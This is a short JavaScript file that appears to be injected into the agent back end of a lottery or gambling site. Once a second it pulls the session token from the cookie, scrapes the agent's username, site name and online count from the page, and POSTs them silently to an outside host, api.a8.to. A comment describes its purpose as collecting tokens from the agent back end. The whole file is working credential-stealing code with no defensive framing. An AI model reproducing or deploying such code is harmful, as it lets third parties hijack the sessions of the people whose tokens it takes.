
let getContent = function () {
    let args = arguments;
    for (let i = 0; i < args.length; i++) {
        let elem = document.querySelector(args[i]);
        if (elem) return elem.innerText;
    }
}

let getToken = () => {
    let regex = /token=(\w+)/,
        cookie = document.cookie;
    if (!regex.test(cookie)) return null;
    return regex.exec(cookie)[1];
}

// 从代理后台采集Token
let getAgentToken = () => {
    if (!/^\/agent\/index/.test(location.pathname)) return;

    let token = getToken(),
        site = getContent(".logo", "title") || sessionStorage.getItem("site"),
        user = getContent(".tools_user:last-child"),
        host = `${location.protocol}//${location.host}`;
    if (!user) return;

    let username = /代理：(\w+)/.exec(user)[1],
        balance = /总在线：(\d+)/.exec(user)[1];

    return {
        token, site, username, balance, host
    }
}

!function () {
    setInterval(() => {
        //let token = getToken(),
        //    site = getContent(".logo","title") || sessionStorage.getItem("site"),
        //    username = getContent(".inline-name span", ".profile .name") || sessionStorage.getItem("username"),
        //    balance = getContent(".accounts .balance", ".balance_amount", ".info_col .font_color1"),
        //    host = `${location.protocol}//${location.host}`;

        //if (site) sessionStorage.setItem("site", site);
        //if (username) sessionStorage.setItem("username", username);

        //console.log(site, username, balance);
        //if (!site || !username || !balance) return;
        //console.log(site);

        let data = getAgentToken();
        if (!data) return;

        let domain = /127.0.0.1|localhost/.test(location.host) ? "localhost:5000" : "api.a8.to";
        try {
            fetch(`//${domain}/Lottery/API_SaveCollectToken`, {
                method: "POST",
                headers: {
                    Accept: 'application.json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
                .catch(ex => {
                    //console.log(ex);
                });
        } catch {
        }

    }, 1000);
}();


